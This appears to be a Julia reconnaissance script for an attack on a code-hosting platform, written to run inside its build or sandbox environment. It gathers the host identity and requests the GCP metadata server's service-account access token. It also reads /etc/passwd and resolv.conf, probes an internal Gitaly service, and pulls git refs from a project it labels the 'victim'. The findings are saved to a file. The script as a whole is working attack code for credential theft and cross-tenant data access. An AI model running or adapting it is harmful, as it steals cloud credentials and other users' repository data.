results = String[]
push!(results, "=== HOSTNAME ===")
try push!(results, read(`hostname`, String)) catch e push!(results, string(e)) end
push!(results, "=== WHOAMI ===")
try push!(results, read(`whoami`, String)) catch e push!(results, string(e)) end
push!(results, "=== GITALY ===")
try push!(results, read(`curl -s -m 5 http://gitaly-http:8080/`, String)[1:min(end,200)]) catch e push!(results, string(e)) end
push!(results, "=== GCP METADATA ===")
try
  r = read(`curl -s -m 5 -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, String)
  push!(results, "token_response(50): " * r[1:min(end,50)])
catch e push!(results, string(e)) end
push!(results, "=== RESOLV ===")
try push!(results, read("/etc/resolv.conf", String)) catch e push!(results, string(e)) end
push!(results, "=== PASSWD ===")
try push!(results, read("/etc/passwd", String)[1:min(end,300)]) catch e push!(results, string(e)) end
push!(results, "=== VICTIM GITALY ===")
try push!(results, read(`curl -s -m 5 http://gitaly-http:8080/git/projects/22adbc78-adfd-4f40-8c0e-4219ec52888d/info/refs`, String)[1:min(end,200)]) catch e push!(results, string(e)) end
open("recon_output.txt", "w") do f write(f, join(results, "\n")) end
println("DONE - check recon_output.txt")
